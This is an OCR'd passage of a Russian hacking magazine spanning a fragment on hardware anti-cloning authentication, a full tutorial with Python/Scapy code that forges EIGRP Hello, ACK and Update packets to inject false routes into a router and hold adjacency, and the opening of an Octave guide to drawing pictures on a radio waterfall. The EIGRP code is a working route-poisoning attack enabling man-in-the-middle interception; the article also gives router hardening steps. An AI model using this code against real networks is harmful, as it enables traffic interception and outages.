воз вращает ся на сервер. Сер вер же в свою очередь выполняет точ но такое
же пре обра зование и сравнивает получив шееся зна чение с тем, что отправил
клиент. Если значения совпада ют, аутен тификация считается успешной.
  Базовые реали зации такого метода прос ты, но подверже ны брутфорсу.
Более прод винутый вариант — при менение цифровой подписи для под-
тверждения под линности передан ного набора данных (именно этот подход c
2020-х годов исполь зует один из круп ных автокон цернов, чтобы осложнить
жизнь неофициальным автодиаг ностам, тюнерам и всячес ким смотчикам
про бегов). Но здесь снова возника ет необходимость исполь зования серь-
езных вычислитель ных ресурсов.
  Наконец, разработ чики при бегают к использованию спе циальных аппа-
рат ных средств, к примеру Atmel CryptoMemory — памяти, специально раз-
работанной для защиты от копирования и кло ниро вания (хотя и эту тех-
нологию нельзя назвать неуязвимой, PDF). Существуют аппаратные решения
и  для   аутентификации  циф ровых   устройств,   в   частности   Atmel
CryptoAuthentication и Maxim DeepCover (PDF).




                      DeepCover и некоторые другие про дукты исполь-
                       зуют физически нек лонируемые фун кции вместо
                      при вычных    криптографических    алгоритмов
                       для  генера ции  уникальных  иден тификаторов.
               ФНФ  полага ется  на физические  особенности
                       полуп роводникового  кристалла  и  позволяет
                      исключить  необходимость массивных  матема-
                        тичес ких вычислений, а следователь но, избежать
                     повышенных требований к ресурсам микрокон-
                        троллера.
КОДИНГ





В этой статье я покажу, как на Python мож-
но сде лать инъекцию лож ных маршрутов
в домен EIGRP. При некото ром везении
такая инъекция позволит зло умыш леннику
                                                                            Александр Михайловпро вести атаку типа MITM или на некото-                                                                                            mikhailov.alexander99@yandex.ru
рое вре мя устроить хаос в домене мар-
шрутизации. Мы в деталях разберем про-
цесс установ ления соседс тва с мар шру-
тизатором и обмен маршрутной информа-
цией, а в качестве бонуса смастерим нес-
ложный графический интерфейс.


ÊÐÀÒÊÈÉ ËÈÊÁÅÇ ÏÎ EIGRP

EIGRP — это протокол динамической маршру тиза ции, по клас сифика ции
относящий ся к дистанци онно-векторным протоко лам (Distance Vector) внут-
ренне го шлюза (IGP). Ниже — схема стро ения EIGRP.





Каж дый пакет EIGRP содержит 20-бай товый заголовок со сле дующими
полями.
 1. Version — версия протокола никогда не изменялась и име ет значение 2.
 2. Opcode (Operation Code) — поле, определяющее тип пакета. Нам инте-
   ресны толь ко два значения этого поля: 1 и 5. Значение 5 опре деля ет Hello-
   пакет, а зна чение 1 — Update-пакет. Про типы пакетов поговорим чуть
   позже.
 3. Ñhecksum — кон трольная сум ма.
 4. Flags — это поле принимает всего четыре значения: 0x1, 0x2, 0x4 и 0x8.
  Нам будут интерес ны только пер вое и пос леднее значения.
 5. Sequence Number  (SEQ) и Acknowledgment Number  (ACK) —
   это порядковый номер пакета и номер подтвержде ния соответствен но
   (пря мо как в TCP и UDP). Эти поля обеспечивают надежную доставку
   EIGRP-пакетов.
 6. Virtual Router ID — виртуальный иден тификатор роутера.
 7. Autonomous System Number — номер авто номной системы  (AS),
   в которой работа ет маршру тиза тор.

За этим заголовком следует TLV (Type, Length, Value) — грубо говоря, это вто-
рой заголо вок переменного зна чения, который может содержать информа-
цию о мар шрутах, параметрах роуте ра, версии прошивки, аутентификации
и так далее. Это похоже на стро ение DHCP, где после IP-заголовка следует
DHCP, а за ним — заголовок BOOTP.
   Те перь погово рим про сооб щения EIGRP. В процес се маршрутизации
EIGRP оперирует следующими типами пакетов (сообщениями):
 • Hello.  Сообщения  приветствия  отправляют ся  на  мультикастовый
   адрес 224.0.0.10 и имеют код операции (opcode) равный 5. По умол чанию
   интервал отправ ки Hello-пакетов составляет 5 секунд.
 • Update. При помощи Update-пакетов мар шрутизаторы сообщают друг
   другу информацию обо всех извес тных им сетях (при первичном установ-
   лении соседства), информацию о кон кретных сетях, в случае перестро-
   ения мар шру та до них или когда сеть наз начения больше не дос тупна.
   Такие сообщения могут отправляться как на юникастовый, так и на муль-
   тикастовый  адре са. В  теле  Update-пакета  содержится  следующая
  информация: адрес сети назначения, префикс маски сети, адрес сле-
  дующе го перехода,  количество перехо дов, про пускная способность,
   задержка, надежность, загрузка и MTU. Получе ние Update-пакета под-
   тверждается отправ кой ACK.
 • ACK. Этот тип сообщения отправляется как ответ на успешное получе ние
   всех остальных типов сообщений, кроме Hello. В поле ACK заголовка
   EIGRP записы вается числовое зна чение: берется поле SEQ того сооб-
   щения, на которое отправляется подтвержде ние, и прибав ляется единица.




                  И в сообщении Hello, и в сообщении ACK поле
                   opcode всегда равно 5. Что это значит? Получа-
                          ется,  что,  к примеру, в ответ на сообщение
                       Update  отправляется,  по  сути,  Hello-пакет?
                       Отчасти да, но это не совсем так. Ненулевое зна-
                       чение поля ACK превращает сооб щение  Hello
                        в сообщение ACK. Таким обра зом, нес мотря
                       на одинаковое зна чение поля opcode, сооб щения
                        отличает зна чение поля ACK.


Также EIGRP опе рирует еще несколькими сооб щениями: Query, Reply, SIA-
Query и SIA-Reply. Но они нам неинтересны, поэтому про пускаем их.
  Перед тем как мы будем уста навливать соседство, перечислю необ-
ходимые для него условия:
 • параметры аутентифика ции должны быть одинако выми (при наличии
  самой аутентификации);
 • значения K-коэф фици ентов также должны быть оди нако выми;
 • маршрутиза торы дол жны находиться в одной автоном ной сис теме (AS).

По умолчанию Hello- и Dead-интервалы составляют 5 и 15 секунд соответс-
твен но. В отличие от OSPF эти интерва лы не обязаны совпадать на маршру-
тизаторах для установления соседства. Но мы уста новим идентичные зна-
чения тай меров.


ÃÐÀÔÈ×ÅÑÊÈÉ ÈÍÒÅÐÔÅÉÑ. ÓÇÍÀЁÌ ÍÅÎÁÕÎÄÈÌÛÅ
ÏÀÐÀÌÅÒÐÛ ÌÀÐØÐÓÒÈÇÀÒÎÐÀ

Как ты уже понял, писать код я буду на Python. Для формирования сетевых
пакетов нам понадобится биб лиотека Scapy. Связка из Scapy и Python прос-
та, удобна и прак тична.
  По ходу дела нам не при дется искать роутер, под держивающий EIGRP,
или настраивать виртуальный. Дос таточно иметь доступ к сети с доменом
EIGRP.
  Преж де чем искать маршрутизаторы EIGRP и уста навливать с ними
соседство, хочу показать интерактивный гра фический интерфейс своего
скрип та.





Для установления соседства на маршрутиза торах должны совпадать нес коль-
ко параметров, к тому же для отправки EIGRP-пакетов конкретному роутеру
нам нужно знать его канальный и сетевой адреса. Поэтому не хотелось бы
высматри вать тра фик в Wireshark и искать параметры мар шрутизатора,
с которым мы захотим «подружиться». Будет куда удобнее просто запустить
прос лушивание и захват пакетов EIGRP, а затем записать парамет ры (IP-
адрес, MAC-адрес, номер AS, Hold-тай мер и зна чения K-коэф фици ентов)
в удоб ные для нас переменные, что бы дальше ими оперировать при краф-
тинге пакетов.
  При нажатии на кнопку Scan запус тится прослушивание и захват одного
EIGRP-пакета (ip proto 88) через интерфейс Ethernet, а затем этот пакет
передастся в функцию analyze_packet() для дальнейших опытов:


sniff(filter="ip proto 88", prn = analyze_packet, count = 1, iface =
"Ethernet")

А вот, собственно, и сама фун кция:


def analyze_packet(packet):
  if packet.haslayer(EIGRP):
    global target_mac
    target_mac = packet[Ether].src
  if packet.haslayer(EIGRP):
    global target_ip
    target_ip = packet[IP].src
  if packet.haslayer(EIGRP):
    global autonomous_system
    autonomous_system = packet[EIGRP].asn
  if packet.haslayer(EIGRP):
    k1 = packet[EIGRPParam].k1
    k2 = packet[EIGRPParam].k2
    k3 = packet[EIGRPParam].k3
    k4 = packet[EIGRPParam].k4
    k5 = packet[EIGRPParam].k5
  if packet.haslayer(EIGRP):
    global hold_time
    hold_time = packet[EIGRPParam].holdtime

Фун кция считывает из захваченного пакета MAC- и IP-адрес мар шрутиза тора,
авто ном ную систему, где он работа ет, зна чения K-коэффициентов, Dead-
интервал и записы вает их в соот ветс твующие переменные. На скриншоте
ниже — то, как эти параметры отоб ражаются в гра фическом интерфей се.





ÊÐÀÔÒÈÌ HELLO-ÏÀÊÅÒ È ÄÐÓÆÈÌ Ñ EIGRP-ÐÎÓÒÅÐÎÌ

Те перь у нас есть все необходимые дан ные, что бы отправить наш первый
Hello-пакет. Для этого мне нужно сра зу в под разделе «Параметры инъ екции»
ввести желаемое количество лож ных сетей назначения вместе с префиксами
масок и нажать кнопку Run.





При нажатии на кнопку запус кается функция run_Button_command(), после
чего вве ден ные значения полей для адресов сетей и префиксов передаются
в соответствующие переменные:


internal_net_1 = input_net_internal_1.get()
internal_net_2 = input_net_internal_2.get()
internal_net_3 = input_net_internal_3.get()
internal_prefix_1 = input_prefix_internal_1.get()
internal_prefix_2 = input_prefix_internal_2.get()
internal_prefix_3 = input_prefix_internal_3.get()
external_net_1 = input_net_external_1.get()
external_net_2 = input_net_external_2.get()
external_net_3 = input_net_external_3.get()
external_prefix_1 = input_prefix_external_1.get()
external_prefix_2 = input_prefix_external_2.get()
external_prefix_3 = input_prefix_external_3.get()

Те перь выясним, какие поля заполнены, а какие не запол нены, и в соот ветс-
твии с этим опре делим, какие сети будут передавать ся в сообщении EIGRP
Update. Если, нап ример, поля внешних маршру тов не заполнены, то в пакете
обновле ния будут только внут ренние маршруты, и наоборот:


  if internal_net_1 != "" and internal_net_2 != "" and internal_net_3
!= "":
      internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_1, prefixlen=int(internal_prefix_1)) \
                     / EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_2, prefixlen=int(internal_prefix_2)) \
                     / EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_3, prefixlen=int(internal_prefix_3))
    if internal_net_1 != "" and internal_net_2 != "" and
internal_net_3 == "":
      internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_1, prefixlen=int(internal_prefix_1)) \
                     / EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_2, prefixlen=int(internal_prefix_2))
    if internal_net_1 != "" and internal_net_2 == "":
      internal_route = EIGRPIntRoute(nexthop="0.0.0.0", dst=
internal_net_1, prefixlen=int(internal_prefix_1))
    if internal_net_1 == "":
      internal_route = ""


    if external_net_1 != "" and external_net_2 != "" and
external_net_3 != "":
      external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_1, prefixlen=int(external_prefix_1)) \
                     / EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_2, prefixlen=int(external_prefix_2)) \
                     / EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_3, prefixlen=int(external_prefix_3))
    if external_net_1 != "" and external_net_2 != "" and
external_net_3 == "":
      external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_1, prefixlen=int(external_prefix_1)) \
                     / EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_2, prefixlen=int(external_prefix_2))
    if external_net_1 != "" and external_net_2 == "":
      external_route = EIGRPExtRoute(nexthop="0.0.0.0", dst=
external_net_1, prefixlen=int(external_prefix_1))
    if external_net_1 == "":
      external_route = ""

Об рати внимание на параметр nexthop="0.0.0.0". Он говорит, что добрать-
ся до этой сети назначения мож но через тот  узел, который отправил
это сообщение EIGRP Update, — то есть через нас.
  Наконец, собираем пакет EIGRP Hello. Для это го вызываем функцию
hello():


  def hello():
    hello_packet = Ether(dst="01:00:5e:00:00:0a") / IP(dst="224.0.0.
10") / EIGRP(opcode=5, asn=autonomous_system) / EIGRPParam(holdtime=
hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / EIGRPSwVer(ios=ios)
    sendp(hello_packet, iface="Ethernet", count=1)
  hello()

Так как Hello-пакеты отправляются на муль тикас товые адреса, в Ethernet-кад-
ре и IP-пакете в качестве адреса назначения прос тавляем 01:00:5e:00:00:
0a и 224.0.0.10 соот ветственно. Пакеты с такими адресами слушает только
EIGRP.
  Обрати внимание, что значения коэффициентов, автоном ной сис темы,
версии  IOS  и  Dead-интервала  берутся  из  переменных  функции
analyze_packet, куда мы переда вали захваченный пакет EIGRP. А зна чение
opcode=5 говорит о том, что это действительно Hello-пакет.
  Перед отправ кой посмотрим таб лицу маршру тиза ции на мар шрутизаторе.





А теперь таблицу соседей EIGRP.





Ни там ни там ничего нет. Таблица соседей пустая, а соот ветственно, и в таб-
лице маршрутизации нет маршрутов, полученных по EIGRP. Жмем Run
и отправ ляем Hello-пакет маршрутизатору. Посмотрим на взаимодействие
издалека.





Как только мы отправили Hello-пакет, маршру тиза тор его получил, понял, что
он нашел соседа, и тут же отпра вил нам сообщение Update. Но в заголовке
EIGRP нет анонсируемых сетей, про которые знает маршру тизатор.
   Те перь обрати вни мание на поле Flags: его значение 1 — Init. Нас тало
вре мя поговорить об этом поле подробнее. Дело в том, что EIGRP отправляет
два пакета обновле ния. Первый пакет — с фла гом 1, который озна чает ини-
циализацию и используется при пер вом построении смежности с дру гим
маршрутизатором. И, как ты уже догадал ся, нам следует ждать второго
Update-пакета, где маршрутизатор уже отправит нам маршруты до сетей,
о которых он знает. Нам от него ничего не надо, но наш мни мый роутер будет
вежливым и отправит ему в ответ сооб щение ACK. А сделал я это следующим
образом:


  def ack_send(packet):
    if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
    ack = packet[EIGRP].seq
    ack_packet = Ether(dst=target_mac) / IP(dst=target_ip) / EIGRP(
opcode=5, asn=autonomous_system, ack=ack)
    sendp(ack_packet, iface="Ethernet", count=1)
  sniff(filter="ip proto 88", prn=ack_send, count=5, iface="Ethernet"
)

Сра зу пос ле отправ ки  Hello-пакета еще раз запускаем прослушивание
EIGRP-пакетов, захватываем их и передаем в фун кцию ack_send(). Там мы
выясняем поряд ковый номер зап роса (Seq) и запоми наем его в переменной
ACK. Пос ле это го мы формиру ем ACK-сооб щение, где в поле opcode ука-
зываем значение 5 (как в Hello-пакете). Но, как мы уже знаем, ненулевое зна-
чение поля под тверждения означает, что это пакет EIGRP ACK, и поэтому
в это поле помещаем перемен ную ACK.
  Еще раз посмотрим на дамп тра фика и убедимся, что мы отправили сооб-
щение подтвержде ния.





                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



                 ОТРАВЛЯЕМ ТАБЛИЦУ
          МАРШРУТИЗАЦИИ НА PYTHON




Под тверждение успешно отправлено, но маршру тизатор дол жен отправить
еще один Update-пакет, который ждет функция ack_send().





А вот и вто рой Update-пакет, где маршрутизатор отправляет нам все извес-
тные ему маршруты (в нашем примере всего один — до сети 100.100.100.0/
24) и говорит, что на этом передача обновлений завер шена, о чем свидетель-
ствует флаг 8 — End Of Table. Также он увеличил номер запроса (SEQ) на еди-
ницу (4 + 1 = 5).
  Еще раз отправ ляет ся подтверждение.





ÂÂÎÄÈÌ ÈÍÚÅÊÖÈÞ ËÎÆÍÛÕ ÌÀÐØÐÓÒÎÂ

Те перь наша оче редь отправлять обновления. Сделаем свои собственные
номера запросов рандомными, передадим их в переменную seq и запус тим
функцию update():


  def update():
    init_packet = Ether(dst=target_mac) / IP(dst=target_ip) \
                  / EIGRP(opcode=1, asn=autonomous_system, seq=seq,
flags=1)
    sendp(init_packet, iface="Ethernet", count=1)
    update_packet = Ether(dst=target_mac) / IP(dst=target_ip) \
                 / EIGRP(opcode=1, asn=autonomous_system, seq=seq + 1
, flags=8) \
                 / internal_route / external_route
    sendp(update_packet, iface="Ethernet", count=1)
  seq = random.randint(1, 99)
  update()


Первым делом скрафтим пакет ини циали зации, где укажем сге нери рованный
нами номер зап роса и флаг ини циализации (зна чение 1). Готово. Отправ-
ляем.





Не дожидаясь сооб щения о подтверждении, крафтим второй Update-пакет,
где указываем уве личенный на еди ницу номер подтвержде ния, флаг End
Of Table и, самое главное, лож ные мар шруты (переменные internal_route
и external_route, в которые мы их записали ранее). Отправляем тоже.





А теперь ждем два ACK-подтверждения.





Мы получили два подтверждения, а это значит, что маршру тизатор принял
наши обновле ния и добавил их в свою таб лицу маршру тиза ции. Но проверим
мы это позже. Нам нуж но еще добиться поддержания соседства. Давай
еще раз глянем на трафик.





Пос ле полной синхро низации маршрутизаторов дальнейшие обновления
отправ ляются в виде многоад ресной рас сылки. Вот мы и видим, что маршру-
тизатор отправ ляет другим маршру тиза торам сооб щение Update на муль-
тикастовый адрес с новыми, только что полученными маршрутами. Но кро ме
него, никого боль ше нет, поэто му, чтобы он не спа мил своими обновлениями
и успокоился, отправим ему под тверждение. Этот кусочек кода выполняется
сра зу пос ле отправки наших обновлений.


  def exchange_successfully(packet):
   if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
    ack = packet[EIGRP].seq
    ack_packet = Ether(dst=target_mac) / IP(dst=target_ip) / EIGRP(
opcode=5, asn=autonomous_system, ack=ack)
    sendp(ack_packet, iface="Ethernet", count=1)


   if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 1:
    if packet.haslayer(EIGRPIntRoute):
     if packet[EIGRPIntRoute].dst == internal_net_1 or packet[
EIGRPIntRoute].dst == internal_net_2 or packet[EIGRPIntRoute].dst ==
internal_net_3 or packet[EIGRPExtRoute].dst == external_net_1 or
packet[EIGRPExtRoute].dst == external_net_2 or packet[EIGRPExtRoute].
dst == external_net_3:
      success_label = tk.Label(root, relief="solid", borderwidth=0.2,
highlightbackground="black", highlightcolor="black",
highlightthickness=1)
      ft = tkFont.Font(family='Times', size=11)
      success_label["font"] = ft
      success_label["fg"] = "#333333"
      success_label["justify"] = "center"
      success_label["text"] = "Инъекция успешно введена!"
      success_label.place(x=20, y=630, width=563, height=75)


  sniff(filter="ip proto 88", prn=exchange_successfully, count=1,
iface="Ethernet")

Пос ле отправ ки обновлений сразу начина ется снифинг Update-пакетов
и отправ ка под тверждения на них. Кро ме того, код анализи рует захвачен ный
Update-пакет, и, если он находит там адреса сетей, которые мы отправили
в своем обновлении, значит, маршрутизатор получил их и добавил в свою
таблицу маршрутизации. В интерфейсе прог раммы появ ляется уве дом ление,
которое говорит об успешной инъекции маршру тов.





Де ло за малым: под держивать соседство с маршрутизатором, что бы он
не обнулил свою таб лицу маршру тизации. В кон це прос то зациклим отправку
Hello-пакетов на мультикас товые адре са:


hello_packet = Ether(dst="01:00:5e:00:00:0a") / IP(dst="224.0.0.10")
/ EIGRP(opcode=5, asn=autonomous_system) / EIGRPParam(holdtime=
hold_time, k1=k1, k2=k2, k3=k3, k4=k4, k5=k5) / EIGRPSwVer(ios=ios)
sendp(hello_packet, iface="Ethernet", loop=1, inter=5)

Здесь параметр loop=1 — это как раз таки и есть зацикливание бес конечной
отправ ки пакетов, а inter=5 — интервал их отправки, который по умолчанию
равен 5 секундам.
   Вот пол ная кар тина того, как это все произошло за доли секунды.





ÏÐÎÂÅÐßÅÌ

Сра зу после отправ ки нами первого Hello-пакета маршру тизатор отоб разил
в логе консоли сообщение о том, что за интерфей сом Gi0/1 нашел ся сосед
EIGRP с IP-адре сом 192.168.0.102.



Пос мотрим на таб лицу соседей.





Здесь тоже все в порядке. Маршрутиза тор счи тает, что мы находим ся
за интерфейсом Gi0/1. Ну и самое интерес ное — таб лица маршрутизации.





Все прош ло успешно. Все шесть маршру тов попали в таблицу маршрутиза-
ции, и в качестве next hop указан наш IP-адрес 192.168.0.102.


ÊÀÊ ÇÀÙÈÒÈÒÜÑß?

Øàã 1
Следует настро ить аутен тификацию на маршру тиза торе.
  Соз даем клю чевую цепочку:


Router(config)# key chain myCHAIN

Создаем ключ в ключевой цепочке:


Router(config-keychain)# key 1

Задаем пароль ную фразу для ключа:


Router(config-keychain-key)# key-string EIGRP_auth

Вклю чаем аутен тифика цию по MD5 для EIGRP за номером 100:


Router(config-if)# ip authentication mode eigrp 100 md5

Указываем ключевую цепочку, которую будем исполь зовать для аутентифика-
ции:


Router(config-if)# ip authentication key-chain eigrp 100 myCHAIN

Вот так выглядит Hello-пакет с включенной аутентификацией на маршру тиза-
торе.





При включенной аутентифика ции замет но уве личился размер пакета EIGRP:
с 74 до 114 байт, а поле Digest содержит хеш пароль ной фразы. Мар шру тиза-
тор на другой сто роне сравнивает этот хеш со своим, и если они рав нознач-
ны, то маршрутизаторы ста новятся соседями.


Øàã 2
Нуж но сделать интерфейсы, которые смотрят в локальную или внутреннюю
сеть, пассивны ми:


Router# conf t
Router(config)# router eigrp 100
Router(config-router)# passive-interface g0/1

Мар шрутизатор никак не будет реагировать, если на пас сивный интерфейс
при шел Hello-пакет, и сам не будет их отправлять через него.
GEEK





Waterfall, или водопад, — это спо соб визу-
ализации сиг налов, который можно встре-
тить  практичес ки  во  всех  программах
для работы с радио. Каж дая линия показы-
вает спектр сиг нала, его час тоты и ампли-            qeewqq                                                                                  qeewwqqq@gmail.com
туду. А если немного поколдовать, можно
рисовать на этом водопаде картинки. Этим
мы сегодня и займем ся.





               При мер водопада из программы Gqrx


ÑÈÃÍÀË È ÅÃÎ ÑÏÅÊÒÐ

Спектр — это представление сиг нала в частотной области, которое показы-
вает, какие имен но частоты при сутс твуют в сигнале. Спектр бывает амплитуд-
ным и фазовым. Первый показывает ампли туды час тот в сигнале, а второй —
фазы этих час тот. В современном мире, когда кто-то пишет о спектре, обыч-
но под разуме вается именно амплитудный спектр.
  Сам спектр бывает двух видов: неп рерывный и дискретный. Непрерывный
спектр — это когда сигнал содер жит бесконечное число ком понент, распре-
деленных в диапазоне час тот. Дискрет ный — когда сигнал содержит толь ко
определен ные  частотные компоненты. Такое  характерно для  сигналов,
которые составле ны из, например, суммы синусоид или косину соид.
   Те перь нач нем с самого простого — с синусоидального сигнала.




                     Все свои эксперимен ты с матема тикой я буду
                        делать в Octave.


Создадим синусоиду с амплитудой 1 попугай и час тотой 5 Гц.


% Амплитуда
A = 1;
% Частота в герцах
f = 5;
% Длительность нашего сигнала в секундах
T = 1;
% Частота дискретизации, или количество точек в секунду. Этот
параметр влияет на точность вывода: чем больше точек, тем точнее
сигнал
fs = 100;


% Временной ряд
t = 0:1/fs:T;


% Генерируем!
y = A * sin( 2 * pi * f * t);


plot( t, y);
xlabel('Время (с)');
ylabel('Амплитуда');
title('Синусоида');
grid on;

Пос ле запуска это го кода в Octave ты получишь гра фик синусоиды.





                        Синусо ида

На графике пять положи тельных полупериодов и пять отри цательных, потому
что длительность — 1 с, а частота — 5 Гц, вот и получается, что полных пери-
одов именно пять. Это самый прос той сигнал, который име ет только одну
частоту в спектре — это частота самой синусоиды, то есть 5 Гц.


Ïðåîáðàçîâàíèå Ôóðüå


Пре образование Фурь (символ ℱ) — опе рация, сопоставляющая одной фун-
кции вещественной перемен ной дру гую (вообще  говоря, комплексноз-
начную) функцию вещес твен ной переменной. Эта новая функция описывает
коэф фици енты («ампли туды») при разложении исходной фун кции на элемен-
тарные составляющие — гармонические колеба ния с разными частотами.



По сути, преобразова ние Фурье — это опе рация, которая позволяет раз-
ложить сигнал на его простые составляющие, то есть опре делить, из суммы
каких сиг налов на каких час тотах он сос тоит.





    Разложение сиг нала на элементы с помощью преобра зования Фурье

На картинке выше наглядно показан про цесс такого разложения. Сумма всех
синих сиг налов даст крас ный, а их частоты показа ны на спектре сигнала
справа.
  При пря мом пре обра зовании Фурье мы получа ем на выходе ком плексное
число, которое состоит из реальной и мни мой части.




Комплексное число — это расширенное множес тво вещес твенных чисел.
Комплексные чис ла выглядят следующим обра зом: a + bi, где a и b — вещес-
твен ные числа, а  i — мни мая единица. Мнимая единица — это корень из –1,
то есть i² = –1.
  В радио очень широко используют ся комплексные числа, так как они поз-
воля ют хранить больше информа ции о сигнале. Например, сущес тву ют
амплитуд ный и фазовый спек тры, и первый опре деля ется действительной
частью, а вто рой — мнимой.


Сра зу же хочется упомянуть еще одно из свойств преобразования Фурье:
если сдвигать сигнал во времени, то амплитудный спектр сигнала меняться
не будет. Изменять ся будет толь ко фазовый спектр, который опи сывается
ком плексной частью.


Îáðàòíîå ïðåîáðàçîâàíèå Ôóðüå
Об ратное пре образование Фурье — это процедура получения сигнала
из спек тра. У сиг нала может быть несколько параметров, такие как мак-
симальная амплитуда, диапазон частот и его длительность. Давай начнем
с прос того примера: сделаем сиг нал из спек тра, на котором будет толь ко
отметка в 5 Гц с ампли тудой 1.


% Частота дискретизации в герцах
fs = 1000;
% Длительность сигнала в секундах
T = 1;
% Общее количество отсчетов
N = T * fs;


% Создание спектра
% Инициализация спектра нулями
spectrum = zeros(1, N);


% Частота для отметки в спектре
f_target = 5;
% Индекс для частоты 5 Гц
index = f_target + 1;
% Установка амплитуды
spectrum(index) = 1;

Первым делом задаются параметры: длительность, частота дискретизации
и количество отсче тов на основе длительности и дискре тиза ции. Далее соз-
даем сам спектр — он будет, по сути, просто массивом. Устанавлива ем в нем
все зна чения в ноль и только ампли туду час тоты 5 Гц ставим в единицу.
В этом примере мы устанавливаем только вещес твен ную часть комплексного
числа. Ты можешь попробовать добавить мни мую часть — для этого вместо
spectrum(index) = 1; напиши spectrum(index) = 1 + 4i; и посмотри,
что будет. Фаза сиг нала должна изме ниться.


% Обратное преобразование Фурье для получения сигнала
signal = real(ifft(spectrum));
t = 0:1/fs:T-1/fs;


% Визуализация сигнала
figure;
plot(t, real(signal));
title('Сигнал, полученный из спектра');
xlabel('Время (с)');
ylabel('Амплитуда');


% Визуализация спектра
f_axis = (0:N-1) * fs / N;
figure;
stem(f_axis(1:N/2), abs(spectrum(1:N/2)), 'filled');
title('Спектр с отметкой на 5 Гц');
xlabel('Частота (Гц)');
ylabel('Амплитуда');
xlim([0 10]);

Пре образуем наш спектр в сигнал с помощью команды ifft, которая выпол-
няет обратное преобразование, и строим визуализацию. В моем коде я беру
сра зу реальную часть сиг нала для отоб ражения, но если поменять функцию
real на imag в строке с ifft, то можно будет получить фазовый спектр,
о котором я говорил в начале статьи.


Ñìåøèâàåì ñèãíàëû
Для примера давай сделаем сигнал из сме си трех синусоид на частотах 5,
10 и 15 Гц. Для этого достаточно все эти три синусо иды просто сложить.


% Частота дискретизации в герцах
fs = 1000;
% Продолжительность сигнала в секундах
T = 1;
% Вектор времени
t = 0:1/fs:T-1/fs;


% Частоты
f1 = 5;
f2 = 10;
f3 = 15;


% Синусоиды
signal1 = sin(2 * pi * f1 * t);
signal2 = sin(2 * pi * f2 * t);
signal3 = sin(2 * pi * f3 * t);


% Складываем синусоиды (шок)
signal = signal1 + signal2 + signal3;


plot(t, signal);
xlabel('Время (с)');
ylabel('Амплитуда');
title('Синусоида');
grid on;

Все перемен ные можно по отдельности изу чить в окне Workspace. Нетяже ло
заметить, что t — это массив из 1000 элементов, в котором хранятся вре-
мена отсче тов.


0     0.0010      0.0020      0.0030      0.0040      0.0050      0.
0060 ...

Сам же сигнал (signal1) — это тоже мас сив. Для каждого времени Octave
авто мати чески посчитал синус и создал новый массив. Каждому i-му эле мен-
ту массива с сигналом соот ветс твует i-й элемент массива t, определяющий
вре мя, в которое сиг нал будет иметь такую амплитуду.


0   0.031411    0.062791    0.094108    0.12533 0.15643 0.18738 ...

Ес ли же закон чить выполнение скрип та и посмотреть резуль таты сложения
в переменной signal, то уви дим ожидаемую сумму трех синусоидаль ных сиг-
налов.


0   0.18831 0.37551 0.56048 0.74215 0.91944 1.0913 ...

Те перь можно запустить оставшуюся часть кода и увидеть отри сованную
форму сиг нала.





                 Сиг нал из трех синусоид (5, 10, 15 Гц)

Выг лядит интересно. А теперь посмотрим на амплитудный спектр этого сиг-
нала. Чтобы это сделать, используем следующий код.


% Частота дискретизации в герцах
fs = 1000;
% Продолжительность в секундах
T = 1;
t = 0:1/fs:T-1/fs;


f1 = 5;
f2 = 10;
f3 = 15;


% Синусоиды
signal1 = sin(2 * pi * f1 * t);
signal2 = sin(2 * pi * f2 * t);
signal3 = sin(2 * pi * f3 * t);


% Сложение синусоид
signal = signal1 + signal2 + signal3;


% Выполнение преобразования Фурье
signal_fft = fft(signal);


P2 = abs(signal_fft / length(signal));


P1 = P2(1:length(signal)/2+1);
P1(2:end-1) = 2*P1(2:end-1);


f_axis = fs*(0:(length(signal)/2))/length(signal);


% Визуализация спектра
bar(f_axis, P1, 'hist');
title('Амплитудный спектр сигнала');
xlabel('Частота (Гц)');
ylabel('|P1(f)|');
xlim([0, max(f_axis)]);

Запускаем и получаем три красивых столбика  как раз на частотах  5,
10 и 15 Гц. Прек расно.





                   Спектр нашего сложного сигнала




                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ



                  УЧИМСЯ РИСОВАТЬ
         ИЗОБРАЖЕНИЯ В РАДИОЭФИРЕ





ÊÀÐÒÈÍÊÀ

Те перь, когда мы зна ем, как создавать свои сложные сигналы и как они рас-
кла дываются обратно на сос тавляющие их час тоты, можно приступать к кон-
тролю над миром тем, что выводится на водопа де. Задачу возьмем нес-
ложную — вывести на водопад картинку.
  Перед выводом надо преобра зовать саму картинку — на водопаде не так
уж много цветов, так что палитру придется умень шить. Для надежности вооб-
ще приведем картинку к чер но-белой.
  В теории есть два вари анта: преобра зовать картинку в черно-белую
и брать значение серого цвета пикселя от 0 до 255 или же брать яркость каж-
дого пикселя. Мы остановим ся на вто ром варианте, пос кольку он лучше сов-
местим с разными прог рамма ми, отобража ющими водопад.
   Те перь давай визуали зируем план. Так как водопад выводится пос троч но,
то и нашу картинку надо раз бить на стро ки. В каждой строке — определенное
количество пикселей, пускай для нагляднос ти их будет десять. Зна чения пик-
селей возьмем сле дующие: 1,1,0,0,1,1,1,1,0,1. Значение пикселя будет
амплитудой, а его индекс в стро ке — частотой.





                         Спектр с пикселями

На самом же деле амплитуды у пикселей будут раз ные, так как сама ампли-
туда зависит от яркости пикселя. Важ но учесть еще один момент: на самом
деле строк нуж но боль ше одной. Каждая строка усредня ется за какое-то вре-
мя, так что, что бы нарисовать на водопаде что-то свое, нужно повторять одну
строку несколько раз (чтобы она четко отоб разилась на водопа де). Каждую
строку мы будем дуб лировать определен ное количес тво раз. Количество
строк будет прямо зависеть от вре мени, которое мы зададим на одну строку,
и от частоты дискретизации.
  Конечный алгоритм звучит так: читаем пос троч но картинку и пре образуем
